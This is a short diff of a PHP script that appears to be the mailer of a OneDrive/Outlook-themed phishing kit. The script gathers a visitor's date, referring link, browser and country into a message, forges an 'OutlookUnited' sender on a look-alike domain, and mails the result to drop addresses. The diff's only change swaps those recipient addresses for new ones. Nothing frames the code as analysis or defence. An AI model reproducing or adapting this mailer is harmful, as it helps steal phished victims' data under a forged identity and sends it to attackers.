@@ -43,7 +43,7 @@ $message .= "Date: " . $datedTime . " \n";
 $message .= "CameFrom: " . $post_link . " \n";
 $message .= "Browser: " . $browserID . " \n";
 
-$to = "s.hmoni@yandex.com,mackabenr12@gmail.com";
+$to = "abt2gocrazy@outlook.com,cynnermross@gmail.com";
 $subject = "NewOneDrive Classic || $country";
 $from = "From: OutlookUnited<yougotanew@adobelogz.com>";
 $header = "MIME-Version: 1.0" . "\r\n";
